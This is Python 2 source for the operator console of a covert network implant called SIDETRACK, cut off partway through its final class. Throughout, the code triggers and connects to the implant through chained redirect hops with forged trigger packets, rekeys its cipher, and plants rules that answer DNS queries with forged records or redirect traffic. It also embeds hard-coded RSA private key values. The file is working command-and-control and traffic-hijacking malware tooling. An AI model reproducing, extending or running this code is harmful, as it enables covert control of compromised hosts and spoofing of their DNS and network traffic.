import base
import crypto
import echocmd
import string
import struct
import time
import re
import os
import sys
from socket import *
import rawtcp
import types

class SIDECMD(echocmd.ECHOCMD):
    def __init__(self):
        echocmd.ECHOCMD.__init__(self)
        
    def TypeConvert(self, stype):
        #print "In TypeConvert %d" % (stype)
        if type(stype) != type(''):
            if stype == 1:
                stype = "A"
            elif stype == 2:
                stype = "NS"
            elif stype == 3:
                stype = "MD"
            elif stype == 4:
                stype = "MF"
            elif stype == 5:
                stype = "CNAME"
            elif stype == 6:
                stype = "SOA"
            elif stype == 7:
                stype = "MB"
            elif stype == 8:
                stype = "MG"
            elif stype == 9:
                stype = "MR"
            elif stype == 10:
                stype = "NULL"
            elif stype == 11:
                stype = "WKS"
            elif stype == 12:
                stype = "PTR"
            elif stype == 13:
                stype = "HINFO"
            elif stype == 14:
                stype = "MINFO"
            elif stype == 15:
                stype = "MX"
            elif stype == 16:
                stype = "TXT"
            elif stype == 252:
                stype = "AXFR"
            elif stype == 253:
                stype = "MAILB"
            elif stype == 254:
                stype = "MAILA"
            elif stype == 255:
                stype = "*"
        return stype
    
    def ConvertType(self, rtype):
        if type(rtype) != type(0):
            rtype  = string.upper(rtype)
            if rtype == "A":
                rtype = 1
            elif rtype == "NS":
                rtype = 2
            elif rtype == "MD":
                rtype = 3
            elif rtype == "MF":
                rtype = 4
            elif rtype == "CNAME":
                rtype = 5
            elif rtype == "SOA":
                rtype = 6
            elif rtype == "MB":
                rtype = 7
            elif rtype == "MG":
                rtype = 8
            elif rtype == "MR":
                rtype = 9
            elif rtype == "NULL":
                rtype = 10
            elif rtype == "WKS":
                rtype = 11
            elif rtype == "PTR":
                rtype = 12
            elif rtype == "HINFO":
                rtype = 13
            elif rtype == "MINFO":
                rtype = 14
            elif rtype == "MX":
                rtype = 15
            elif rtype == "TXT":
                rtype = 16
            elif rtype == "AXFR":
                rtype = 252
            elif rtype == "MAILB":
                rtype = 253
            elif rtype == "MAILA":
                rtype = 254
            elif rtype == "*":
                rtype = 255
        return rtype

    def ClassConvert(self, rclass):
        #print "In ClassConvert %d" % (rclass)
        if type(rclass) != type(''):
            if rclass == 1:
                rclass = "IN"
            elif rclass == 2:
                rclass = "CS"
            elif rclass == 3:
                rclass = "CH"
            elif rclass == 4:
                rclass = "HS"
        return rclass
    
    def ConvertClass(self, rclass):
        if type(rclass) != type(0):
            rclass = string.upper(rclass)
            if rclass == "IN":
                rclass = 1
            elif rclass == "CS":
                rclass = 2
            elif rclass == "CH":
                rclass = 3
            elif rclass == "HS":
                rclass = 4
        return rclass

    def ConvertFlags(self, flags):
        # qr rd ra
        retFlags = 0
        if type(flags) != type(0):
            flags = string.upper(flags)
            if flags == "RA":
                retFlags = retFlags | 0x0080L
            if flags == "AA":
                retFlags = retFlags | 0x0400L
        return retFlags

    def SectionConvert(self,section):
        if type(section) != type(''):
            if section == 0:
                section = "query"
            elif section == 1:
                section = "ans"
            elif section == 2:
                section = "auth"
            elif section == 3:
                section = "add"
        return section

    def ConvertSection(self,section):
        if type(section) != type(0):
            section = string.upper(section)
            if section[:1] == "Q":
                section = 0
            elif section[:2] == "AN":
                section = 1
            elif section[:2] == "AU":
                section = 2
            elif section[:2] == "AD":
                section = 3
        return section

    def NameConvertName(self, name):
        ret = ''
        sp = 0
        if type(name) != type(0):
            while name[sp:sp+1] != '\000':
                namelen = struct.unpack("!H",'\000' + name[sp:sp+1])[0]
                #print namelen
                if sp != 0:
                    ret = ret + '.'
                for i in range(1,namelen+1):
                    val = struct.unpack("!H", '\000' + name[sp+i:sp+i+1])[0]
                    if val >= 32 and val < 127:
                        ret = ret + name[sp+i:sp+i+1]
                    else:
                        raise TypeError, self.HexConvert(name)
                sp = sp+1+namelen
        return ret
        

    def NameConvert(self, name, padding=0):
        try:
            return self.NameConvertName(name)
        except:
            return self.HexConvert(name, padding)
        
    def ConvertName(self, name):
        ret = ''
        regExpr = re.compile("^[a-zA-Z0-9-_.]*$")
        if type(name) != type(0x0L):
            reg = regExpr.search(name)
            if reg != None:
                dots = string.splitfields(name,".")
                for i in range(len(dots)):
                    ret = ret + chr(len(dots[i])) + dots[i]
                ret = ret + '\000'
                return ret
            else:
                return name
        else:
            return struct.pack("!H",name)


    def FlagConvert(self, flag):
        if flag == 0:
            return "Ignore"
        elif flag == 1:
            return "Count"
        elif flag == 2:
            return "Active"
            

    def HexConvert(self,data,pad=0):
        ret = ''
        padding = ''
        for i in range(pad):
            padding = padding + ' '
        for i in range(len(data)):
            if i % 16 == 0 and i != 0:
                ret = ret + '\n' + padding
            myNum = struct.unpack("!H", '\000'+data[i:i+1])[0]
            ret = ret + "%02x " % myNum
        ret = ret + '\n' + padding + "(%d)" % (len(data))
        return ret
        
class SIDETRACK(base.Implant):
    def __init__(self, session, proto):
        base.Implant.__init__(self, session, proto)
        self.name = 'SIDETRACK'
        self.newCV = None
        self.targetopts = self.session.target.GetImplantOpts('sidetrack')
        self.version = self.targetopts['VERSION']
        if self.version >= 2.0:
            self.cipher = crypto.rc6()
        else:
            self.cipher = crypto.rc5()
        self.cipher.SetKey(self.targetopts['KEY'])
        self.N = 0xdec9ba81a6b9ea70c876ad3413aa7dd57be75d42e668843b1401fd42015144231004bfab4e459dabdbb159665b48a4d72357c3630d0e911b5b96bf0b0d8ab83f4bb045a13ea2acc85d120c3539f206200b9931a41ad6141eb7212e66784880ff6f32b16e1783d4ca52fe5ec484ef94f019feaf58abbc5de6a62f10eec347ac4dL
        self.d = 0x25219f159bc9a712cc13c788adf1bfa394a68f8b2666c0b48355aa35aae2e0b082ab754737b644f1f9f2e43bb9e170ce85e3f5e5d7826d848f43ca81d7971eb4e7a62bc8e5e0a549bcb9ecb216451f8ba32444a71cb0ff97a77500cb39f802968ae7c10366d3eed895b939ec54eb8c4c54329bddb0eb00e691bc6b5d10d5af05L
        self.Nsign = 0xb2003aac88a36d45d840bc748aa972b3f2e69a29f43f1e2faf810d9172db756d4843492489781764688d29c3a547a1522702d20e10f426149ac2f323bf35dfa1cb036f467109fd321bae03711eab16b210ed131ac077113f1dd34be480508708893c1a40fdc1b1d637e1cf3efd13e6bbbdc88a8c2fc103a45c490ba933a79a31L
        self.dsign = 0x076aad1c85b179e2e902b284db1c64c77f74466c6a2d4beca7500b3b64c924e48dad786185ba564ed9b08c6826e2fc0e16f5736b40b4d6eb8672ca217d4ce95156a1920e3e48fe1dfe82738bb6ec985c441421d188962b141d3113773e8006b1273de6b846635ff7979547b516d7c426d5c3b0e2505150095b81e266e3b97c03L
        self.packetSize = 450
        self.timediff = self.session.target.timediff
        self.localRedir = None
        self.parent = None
        self.children = []
        self.rules = []
        
    def RegisterCommands(self):
        self.AddCommand('ping',      echocmd.ECHOCMD_PING)
        self.AddCommand('status',    echocmd.ECHOCMD_STATUS)
        self.AddCommand('done',      echocmd.ECHOCMD_DONE)
        self.AddCommand('setsize',   echocmd.ECHOCMD_SETSIZE)
        self.AddCommand('timediff',  echocmd.ECHOCMD_TIMEDIFF)
        self.AddCommand('incision',  echocmd.ECHOCMD_INCISION)
        self.AddCommand('rekey',     echocmd.ECHOCMD_REKEY)
        self.AddCommand('switchkey', echocmd.ECHOCMD_SWITCHKEY)
        self.AddCommand('origkey',   echocmd.ECHOCMD_ORIGKEY)
	self.AddCommand('key',       echocmd.ECHOCMD_KEY)
        self.AddCommand('init',      SIDECMD_INIT)
        self.AddCommand('dnsadd',    SIDECMD_DNSADD)
        self.AddCommand('dnsrm',     SIDECMD_DNSREMOVE)
        self.AddCommand('dnsset',    SIDECMD_DNSSET)
        self.AddCommand('dnsaction', SIDECMD_DNSACTION)
        self.AddCommand('dnsraw',    SIDECMD_DNSRAW)
        self.AddCommand('dnslist',   SIDECMD_DNSLIST)
        self.AddCommand('dnsload',   SIDECMD_DNSLOAD)
        self.AddCommand('dnssave',   SIDECMD_DNSSAVE)
        self.AddCommand('rediradd',  SIDECMD_REDIRADD)
        self.AddCommand('redirlist', SIDECMD_REDIRLIST)
        self.AddCommand('redirset',  SIDECMD_REDIRSET)
        self.AddCommand('redirrm',   SIDECMD_REDIRREMOVE)
        self.AddCommand('connlist',  SIDECMD_CONNLIST)
        self.AddCommand('connrm',    SIDECMD_CONNREMOVE)
        self.AddCommand('stunload',  SIDECMD_UNLOAD)
        self.AddCommand('connect',   SIDECMD_CONNECT)
        self.AddCommand('cclist',    SIDECMD_CCLIST)
        self.AddCommand('ccremove',  SIDECMD_CCREMOVE)
        self.AddCommand('multiaddr', SIDECMD_MULTIADDR)


##########################################################################
# HASANOTHERADDRESS class
#########################################################################
class SIDECMD_MULTIADDR(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "multiaddr"
        self.usage = "multiaddr <0|1>"
        self.info = "Let pyside know that the target has multiple addresses"

    def run(self, value=1):
        self.implant.session.target.hasAnotherAddress = value
        return (1, "Value updated")


##########################################################################
# CONNECT class
#########################################################################
class SIDECMD_CONNECT(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "connect"
        self.usage = "connect <listen_address>:<listen_port>/<callback_port> <trigger_port>"
        self.info = "Connect to SIDETRACK"

    def parseHostInfo(self,host):
        #split the ip from the ports
        res = string.split(host,":")
        if len(res) == 1:
            raise ValueError, host
        elif len(res) == 2:
            ports = string.split(res[1],"/")
            if len(ports) != 2:
                raise ValueError, host
            if ports[0] == "*":
                raise ValueError, ports[0]
            else:
                ports[0] = eval(ports[0])
            if ports[1] == "*":
                raise ValueError, ports[1]
            else:
                ports[1] = eval(ports[1])
            try:
                host = None
                ipaddr = self.ConvertIP(res[0])
            except:
		# host references a session
                host = base.sessionDict[res[0]]
                ipaddr = self.ConvertIP(host.target.GetIP())
            return host,ipaddr,ports[0],ports[1]
        else:
            raise ValueError, host
        
    def run(self,hostinfo,fport):
        # Parse the ports
        prevRule = None
        tempRule = None
        localRedir = None

        host,laddr,lport,cbport = self.parseHostInfo(hostinfo)
        if fport == 0:
            PORT = 500

        #open the listener
        try:
            sock = socket(AF_INET,SOCK_STREAM,0)
            sock.bind(('',lport))
            sock.listen(2)
        except error, message:
            return (0, "Could not open port %d %s" % (lport,message))
        
        # See if the user entered another host
        if host != None:
            self.implant.parent = host
	    #hpn is the hop prior to host (might just be "me")
            hpn = host.implant.parent.name
            myname = host.name
            hostinfo = re.sub(myname,hpn,hostinfo)

            # Testing
            localRedir = REDIRECT(self,0,10800,10800,6,\
                                  self.ConvertIP(self.implant.session.target.ip), \
                                  self.ConvertIP(self.implant.session.target.ip),
                                  0,0,0,(0,0,0,0),0,0x201,lport,cbport,0,0)
            localRedir.add(0)
            self.implant.session.localRedir = localRedir
            
            # Add a redirect (on the previous host) for this connection
            cmd = host.GetCommand('rediradd')
            base.ccSupport = 1
            res = cmd.run("tcp",hostinfo,"%s:%d/%d"%(self.implant.session.target.ip,cbport,lport),"-tfix", "-afix","-l","3h","-c","3h")
            base.ccSupport = 0
            if res[0] == 0:
                return res

            # Let the previous implant know this redirect rule is in support
            # of a command and control connection
            prevRule = cmd.redir
            if prevRule != None:
                prevRule.ccPassthru = self.implant.session

            # Add a temporary rule to allow the trigger to be passed to target
            base.ccSupport = 1
            if fport == 0:
                res = cmd.run("udp","%s:%d/%d"%(hpn,PORT,PORT),"%s:%d/%d"%(self.implant.session.target.ip,PORT,PORT),"-tfix",  "-afix")
            else:
                res = cmd.run("tcp","%s:%d/%d"%(hpn,0,fport),"%s:%d/%d"%(self.implant.session.target.ip,fport,0),"-tfix")
            base.ccSupport = 0
            base.db(2,"%d.%d.%d.%d"%(res[2] >> 24, (res[2] >> 16) & 0xff, (res[2] >> 8) & 0xff, res[2] & 0xff))
            if res[0] == 0:
                if prevRule != None:
                    prevRule.remove()
                return (0, "Unable to establish redir for port %d: %s"%(fport,res[1]))
            tempRule = cmd.redir
        else:
            localRedir = None
            prevRule = None
            self.implant.session.localRedir = None
            
        #add the rule
        if tempRule == None or (tempRule != None and \
                             cmd.implant.session.target.hasAnotherAddress == 0):
            rule = base.redir.listen(laddr,\
                                 self.ConvertIP(self.implant.session.target.ip),\
                                 fport,lport,cbport,\
                                 self.implant.timediff, \
                                 self.implant.cipher.GetKey())
        else:
            rule = base.redir.listen(tempRule.ST_ip,\
                                 self.ConvertIP(self.implant.session.target.ip),\
                                 fport,lport,cbport,\
                                 self.implant.timediff, \
                                 self.implant.cipher.GetKey())

                                  
        #Make the connection
        if fport == 0:
            conn = socket(AF_INET,SOCK_DGRAM,0)
            conn.bind(('',PORT))
            conn.connect((self.implant.session.target.ip,PORT))
            f = os.popen("dd if=/dev/urandom bs=128 count=3 2>/dev/null")
            d = f.read()
            f = None
            data = d[0:14] + struct.pack("HBBBB", 0, 0x08, 0x10, 0x20, 0x01) + \
                   d[16:20] + struct.pack("!L", 0x154) + d[20:332]
            conn.send(data)
            conn.close()
            #accept
            self.implant.protocol.sock,addr = sock.accept()
        else:
            #conn = socket(AF_INET,SOCK_STREAM,0)
            # STUB: Catch this in a try statement
            try:
                # esev - 6/24/03
                #conn.connect((self.implant.session.target.ip,fport))
                #conn.close()
                #conn = None
                rawtcp.sendFakeConnection(self.implant.session.target.ip,fport)
                # STUB:  Put a timeout here
                #accept
                self.implant.protocol.sock,addr = sock.accept()
            except:
                base.redir.delete(rule)
                sock.close()
                sock = None
                #if conn != None:
                #    conn.close()
                if localRedir != None:
                    localRedir.remove()
                if prevRule != None:
                    prevRule.remove()
                if tempRule != None:
                    tempRule.remove()
                base.sessionDict[self.implant.session.name] = None
                return (1,"Canceled by user, target %s removed" % self.implant.session.name)
        sock.close()
        sock = None

        # Set the CC redirect to inactive.  This will not effect the
        # current connection..only prevent the rule from getting in the way
        if prevRule != None:
            prevRule.set(0)
        #if there is a connection back return 1 else 0
        if self.implant.protocol.sock:
            cmd = self.implant.session.GetCommand("init")
            res = cmd.run()
            
            # remove the temporary redirect
            if tempRule != None:
                tempRule.remove()
            # remove the connection rule
            base.redir.delete(rule)

            if res[0] == 0:
                return res
            else:
                sys.stderr.write("%s\n"%(res[1]))
                return (1, "Connected")
        else:
            # remove the temporary redirect
            if tempRule != None:
                tempRule.remove()
            # remove the connection rule
            base.redir.delete(rule)
            return (0, "Could not connect")
##########################################################################
# INIT class
# op code: 0x20
#########################################################################
class SIDECMD_INIT(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "init"
        self.usage = "init"
        self.info = "Initialize the implant"

    def run(self):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        cmd = self.implant.session.GetCommand("ping")
        res = cmd.run()
        if res[0] == 0:
            return res
        else:
            sys.stderr.write("%s\n"%(res[1]))
        for i in range(3):
            cmd = self.implant.session.GetCommand("rekey")
            res = cmd.run()
            if res[0] != 0:
                break
        if res[0] == 0:
            return res
        else:
            sys.stderr.write("%s\n"%(res[1]))
        cmd = self.implant.session.GetCommand("switchkey")
        res = cmd.run()
        if res[0] == 0:
            return res
        else:
            sys.stderr.write("%s\n"%(res[1]))
        cmd = self.implant.session.GetCommand("status")
        res = cmd.run()
        if res[0] == 0:
            return res
        else:
            sys.stderr.write("%s\n"%(res[1]))

        return (1,"Initialization complete")


##########################################################################
# DNSREAD class
#########################################################################
class SIDECMD_DNSLOAD(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsload"
        self.usage = "dnsload <filename>"
        self.info = "Send DNS data from a file to the target"
    #-------------------------------------------------------------------------
    # Name   : ProcessArg
    # Purpose: Tests to see if the argument is a string or number
    # Receive: arg - The argument to test
    # Return : The original string if a number, or a quoted string if not
    #-------------------------------------------------------------------------
    def ProcessArg(self,arg):
        if (re.match('^-?[0-9]*(\.[0-9]+)?$',arg) != None or \
            re.match('^0x[0-9a-fA-F]+L?', arg) != None):
            return arg
        else:
            return '"' + arg + '"'

    def runRule(self, args):
        cmd = SIDECMD_DNSADD()
        cmd.implant = self.implant
        argString = 'myRes = cmd.run('
        for i in range(1,len(args)):
            if i == 1:
                argString = argString + self.ProcessArg(args[i])
            else:
                argString = argString + ", " + self.ProcessArg(args[i])
        argString = argString + ')'
        print argString
        exec(argString)
        if myRes and myRes[0]:
            self.lastRule = myRes[0]

    def runSet(self, args):
        cmd = SIDECMD_DNSSET()
        cmd.implant = self.implant
        argString = 'myRes = cmd.run(self.lastRule'
        for i in range(1,len(args)):
            argString = argString + ", " + self.ProcessArg(args[i])
        argString = argString + ')'
        print argString
        exec(argString)

    def runCmd(self, args):
        cmd = SIDECMD_DNSACTION()
        cmd.implant = self.implant
        argString = 'tmp = cmd.run(self.lastRule'
        for i in range(len(args)):
            argString = argString + ", " + self.ProcessArg(args[i])
        argString = argString + ')'
        print argString
        exec(argString)
       
    def run(self, filename):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        file = open(filename,'r')
        self.lastRule = 0
        while 1:
            line = file.readline()
            if not line:
                line = None
                return (1, "Input from file complete")
            args = base.SplitCommandString(string.strip(line))
            if len(args) == 0:
                continue
            elif args[0][0:1] == '#' or args[0] == '':
                continue
            elif args[0] == "rule":
                self.runRule(args)
                print "Rule %d added\n" % (self.lastRule)
            elif args[0] == "set":
                self.runSet(args)
            else:
                self.runCmd(args)
        return (0, "problem")

##########################################################################
# DNSADD class
# op code: 0x18
#########################################################################
class SIDECMD_DNSADD(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsadd"
        self.usage = "dnsadd <from ip> <from mask> <longevity> <type> <class> <name> [dns flags]"
        self.info = "Add a DNS entry into sidetrack (see also dnsset)"
        self.op = 0x18L

    def run(self,ip,mask,length,rtype,rclass,name,flags=0x0080L):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        ipStr = self.ConvertIP(ip)
        maskStr = self.ConvertIP(mask)

        rtype = self.ConvertType(rtype)
        rclass = self.ConvertClass(rclass)
        name = self.ConvertName(name)
        length = self.ConvertTime(length)
        
        self.data = ipStr + maskStr + struct.pack("!LHHHH",length,flags,\
                                                  rtype,rclass,len(name)) +name
        self.Query()
        if( self.op == 0x18L and self.res == 0x1L ):
            dnsRes = struct.unpack("!l",self.data[0:4])[0]
            return (dnsRes, "Add successful, rule number: %d" % dnsRes)
        else:
            return (0, "Add failed")


##########################################################################
# DNSREMOVE class
# op code: 0x19
#########################################################################
class SIDECMD_DNSREMOVE(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsrm"
        self.usage = "dnsrm <rule|all>"
        self.info = "Remove a dns rule"
        self.op = 0x19L

    def run(self,rule):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if type(rule) == type("a") and string.upper(rule)[:1] == 'A':
            rule = 0
        self.data = struct.pack("!l",rule)
        self.Query()
        if self.op == 0x19L and self.res == 0x01L:
            return (1,"Rule(s) removed")
        else:
            return (0,"unable to remove rule(s)")


##########################################################################
# DNSSET class
# op code: 0x20
#########################################################################
class SIDECMD_DNSSET(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsset"
        self.usage = "dnsset <rule> <ignore|count|active>"
        self.info = "Turn a DNS rule on or off"
        self.op = 0x20L

    def run(self,rule,onoff):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        self.data = struct.pack("!l",rule)
        if onoff[0:1] == "a" or onoff[0:1] == "A":
            self.data = self.data + struct.pack("!h", 2)
        elif onoff[0:1] == "c" or onoff[0:1] == "C":
            self.data = self.data + struct.pack("!h", 1)
        else:
            self.data = self.data + struct.pack("!h", 0)
            
        self.Query()
        if self.op == 0x20L and self.res == 0x01L:
            return (1,"rule %d successfully set to %s" %\
                    (rule, onoff))
        else:
            return (0,"unable to set rule to %s" % onoff)


##########################################################################
# DNSRAW class
# op code: 0x21
#########################################################################
class SIDECMD_DNSRAW(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsraw"
        self.info = "Upload a binary dns response packet"
        self.usage = "dnsraw <rule> <filename>"
        self.op = 0x21L

    def run(self, rule, filename):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0, msg)
        
        file = open(filename,'r')
        file.seek(0,2)
        filesize = file.tell()
        file.seek(0,0)
        
        maxchunksize = self.implant.packetSize - 34
        numchunks = filesize / maxchunksize
        
        if filesize%maxchunksize > 0:
            numchunks = numchunks + 1

        for i in range(numchunks):
            self.data = file.read(maxchunksize)
            self.data = struct.pack("!LHHHH",rule,i,numchunks,4,\
                                    len(self.data)) + self.data
            self.Query()
            if (self.op != 0x21L or self.res != 0x1L):
                return (0,"Binary upload failed at chunk %d"%(i+1))
        return (1,"Binary upload of %d chunks successful"%(numchunks))
        
##########################################################################
# DNSACTION class
# op code: 0x21
#########################################################################
class SIDECMD_DNSACTION(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnsaction"
        self.info = "Set the action for a rule"
        self.usage = "dnsaction <rule> <ans|auth|add> <name> <type> <class> <ttl> <data>"
        self.op = 0x21L

    def run(self,rule,sect,name,rtype,rclass,ttl,data):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)

        name = self.ConvertName(name)
        sect = self.ConvertSection(sect)
        rtype = self.ConvertType(rtype)
        rclass = self.ConvertClass(rclass)
        ttl = self.ConvertTime(ttl)
        if rtype == 1:
            data = self.ConvertIP(data)
        else:
            data = self.ConvertName(data)
        self.data = struct.pack("!LLHHHHH", rule, ttl, sect, rtype,\
                                rclass,\
                                len(name),\
                                len(data))+\
                                name+data
            
        self.Query()
        if self.op == 0x21L and self.res == 0x01L:
            return (1,"%s action for rule %d set successfully" % \
                    (sect, rule))
        else:
            return (0,"Could not set action")


##########################################################################
# DNSLIST class
# op code: 0x22
#########################################################################
class SIDECMD_DNSLIST(SIDECMD):
    def __init__(self):
        SIDECMD.__init__(self)
        self.name = "dnslist"
        self.usage = "dnslist [-v] [rule] [section]"
        self.info = "Retrieve a section of a rule from SIDETRACK"
        self.op = 0x22L

    def ParseReturn(self):
        if self.implant.version < 2.0:
            self.lastport = 0
            (self.retVal, self.rule, self.fromIP, self.fromMask, self.longevity,\
             self.lastIP, self.lastTime, self.seen, self.flag, self.ttl, \
             self.dnsflags, self.rtype, self.rclass, self.rsec, \
             self.nlen, self.dlen) =\
                struct.unpack("!lLLLLLLHHLHHHHHH", self.data[0:48])
            self.dnsname = self.data[48:48+(self.nlen)]
            self.dnsdata = self.data[48+(self.nlen):48+(self.nlen)+(self.dlen)]
            
        else:
            (self.retVal, self.rule, self.fromIP, self.fromMask, self.longevity,\
             self.lastIP, self.lastTime, self.seen, self.flag, self.lastport, \
             self.dnsflags, self.ttl, self.rtype, self.rclass, self.rsec, \
             self.nlen, self.dlen) =\
                struct.unpack("!lLLLLLLHHHHLHHHHH", self.data[0:50])
            self.dnsname = self.data[50:50+(self.nlen)]
            self.dnsdata = self.data[50+(self.nlen):50+(self.nlen)+(self.dlen)]

    def GetRuleString(self):
        printOut = "%10d %s/%s %-7s %s\n" % \
                   (self.rule,
                    self.ConvertToDot(self.fromIP),
                    self.ConvertToDot(self.fromMask),
                    self.FlagConvert(self.flag),
                    time.ctime(self.longevity+self.implant.timediff)[4:])
        printOut = printOut + "   %5s: %-5d %s:%d %s\n" %\
                   ("count",
                    self.seen,
                    self.ConvertToDot(self.lastIP),
                    self.lastport,
                    time.ctime(self.lastTime + self.implant.timediff))
        return printOut + self.GetSectionString()
        
    def GetRule(self,rule,sec=0):
        sec = self.ConvertSection(sec)
        #print "Getting section %d of rule %d\n" % (sec,rule)
        self.data = struct.pack("!LLH",rule,0,sec)
        self.Query()
        if self.op == 0x22L and self.res == 0x01L:
            self.ParseReturn()
            printOut = self.GetRuleString()
            return (1, printOut)
        else:
            return (0,"Error receiving result\n")
    
    def GetNextRule(self,lastRule,sec=0):
        sec = self.ConvertSection(sec)
        print "Getting section %d of rule after %d\n" % (sec,lastRule)
        self.data = struct.pack("!LLH",0,lastRule,sec)
        self.Query()
        if self.op == 0x22L and self.res == 0x01L:
            self.ParseReturn()
            if self.retVal == 0:
                lastRule = self.rule
            elif self.retVal == 2:
                lastRule = -2
            else:
                lastRule = -1
            if lastRule == -2:
                lastRule = -1
                printOut = 'There are currently no rules'
            else:
                printOut = self.GetRuleString()
            return (lastRule, printOut)
        elif lastRule == 0:
            print self.res
            return (0,"There are currently no rules!")
        else:
            return (0,"Error receiving result\n")

    def GetSectionString(self):
        printOut = "   %5s: %-5s %-3s %-5d " % \
                   (self.SectionConvert(self.rsec),
                    self.TypeConvert(self.rtype),
                    self.ClassConvert(self.rclass),
                    self.ttl&0xffffffL)
        if self.nlen:
            try:
                printOut = printOut + "%s\n" % \
                           (self.NameConvertName(self.dnsname))
            except:
                printOut = printOut + "\n       N: %s\n" %\
                           (self.HexConvert(self.dnsname,10))
        if self.dlen:
            if self.rtype == 1 and self.dlen == 4:
                printOut = printOut + \
                           "       D: %s\n" % \
                           (self.ConvertToDot(self.dnsdata))
            else:
                printOut = printOut + \
                           "       D: %s\n" %\
                           (self.NameConvert(self.dnsdata,10))
        return printOut

    def GetSection(self,rule,section):
        print "Getting section %d of rule %d\n" % (section,rule)
        self.data = struct.pack("!LLH",rule,0,section)
        self.Query()
        if self.op == 0x22L and self.res == 0x01L:
            self.ParseReturn()
            if self.rsec == 4:
                return (1, '')
            return (1,self.GetSectionString())
        else:
            return (0, "Could not get section")

    def preRuleString(self):
        return "-----------------------------------------------------------------------\n"

    def postRuleString(self):
        return ''
    
    def runAll(self):
        moreRules = 1
        lastRule = 0
        printOut = ''
        while moreRules:
            res = self.GetNextRule(lastRule)
            if res[0] == 0:
                return res
            elif res[0] == -1:
                moreRules = 0
                lastRule = self.rule
            else:
                lastRule = res[0]
            printOut = printOut + self.preRuleString()
            printOut = printOut + res[1]
            for i in range(1,4):
                sec = self.GetSection(lastRule, i)
                if sec[0] == 0:
                    return (0, printOut)
                printOut = printOut + sec[1]
            printOut = printOut + self.postRuleString()
        return (1, printOut)
            

    def run(self,rule=-1, sec=-1, ext=-1):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if rule == -1:
            lastRule = 0
            moreRules = 1
            printOut = ''
            while moreRules:
                res = self.GetNextRule(lastRule)
                if res[0] == 0:
                    return res
                elif res[0] == -1:
                    moreRules = 0
                    lastRule = self.rule
                else:
                    lastRule = res[0]
                printOut = printOut + res[1]
        elif rule == "-v":
            if sec == -1:
                return self.runAll()
            else:
                if ext == -1:
                    res = self.GetRule(sec)
                    if res[0] == 0:
                        return res
                    printOut = res[1]
                    for i in range(1,4):
                        sd = self.GetSection(sec, i)
                        if sd[0] == 0:
                            return (0, printOut)
                        printOut = printOut + sd[1]
                else:
                    return self.GetRule(sec,ext)
        else:
            if sec == -1:
                return self.GetRule(rule)
            else: # Rule != 0 and sec != -1
                return self.GetRule(rule,sec)
        return (1,printOut)

##########################################################################
# DNSREAD class
#########################################################################
class SIDECMD_DNSSAVE(SIDECMD_DNSLIST):
    def __init__(self):
        SIDECMD_DNSLIST.__init__(self)
        self.name = "dnssave"
        self.usage = "dnssave [rule] [filename]"
        self.info = "Save one of more rules"

    def ToOct(self, data):
        if type(data) == type(0x0L) or type(data) == type(0):
            ret = ''
            if data > 255:
                if data > 65535:
                    if data > 16777215:
                        ret = ret + "\\%o" % ((int)(data/16777216)&0xffL)
                    ret = ret + "\\%o" % ((int)(data/65536)&0xffL)
                ret = ret + "\\%o" % ((int)(data/256)&0xffL)
            ret = ret + "\\%o" % (data & 0xffL)
        else:
            reg = regex.compile("^[a-zA-Z0-9-_.]*$")
            ret = ''
            for i in range(len(data)):
                if reg.match(data[i:i+1]) != None:
                    ret = ret + data[i:i+1]
                else:
                    ret = ret + "\\%o" % \
                          struct.unpack("!H",'\000'+data[i:i+1])[0]
        return '"' + ret + '"'

    def NameConvertName(self, name):
        reg = regex.compile("^[a-zA-Z0-9-_.]*$")
        ret = ''
        sp = 0
        if type(name) != type(0):
            while name[sp:sp+1] != '\000':
                namelen = struct.unpack("!H",'\000' + name[sp:sp+1])[0]
                #print namelen
                if sp != 0:
                    ret = ret + '.'
                for i in range(1,namelen+1):
                    if reg.match(name[sp+i:sp+i+1]) != None:
                        ret = ret + name[sp+i:sp+i+1]
                    else:
                        raise TypeError, self.ToOct(name)
                sp = sp+1+namelen
        return ret

    def NameConvert(self, name, padding=0):
        try:
            return self.NameConvertName(name)
        except:
            return self.ToOct(name)

    def GetSectionString(self):
        printOut = "%s %s %s %s %d " % \
                   (self.SectionConvert(self.rsec),
                    self.NameConvert(self.dnsname),
                    self.TypeConvert(self.rtype),
                    self.ClassConvert(self.rclass),
                    self.ttl&0xffffffL)
        if self.dlen:
            if self.rtype == 1 and self.dlen == 4:
                printOut = printOut + self.ConvertToDot(self.dnsdata)
            else:
                printOut = printOut + self.NameConvert(self.dnsdata,10)
        return printOut + '\n'
    

    def GetRuleString(self):
        printOut = "rule %s %s %d %s %s %s 0x%04x\n" % \
                   (self.ConvertToDot(self.fromIP),
                    self.ConvertToDot(self.fromMask),
                    self.longevity - self.rule,
                    self.TypeConvert(self.rtype),
                    self.ClassConvert(self.rclass),
                    self.NameConvert(self.dnsname),
                    self.dnsflags)
        return printOut
    
    def preRuleString(self):
        return "# -----------------------------------------------------------------------\n"

    def postRuleString(self):
        return "set %s\n" % (self.FlagConvert(self.flag))
    
    def run(self,rule=-1, file=-1):
        msg = echocmd.ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        if rule == -1: # All Rules to stdout
            return self.runAll()
        elif type(rule) == type(''): # All rules to file
            out = open(rule,'w')
            res = self.runAll()
            if res[0] == 0:
                return res
            out.write(res[1])
            out = None
            return res
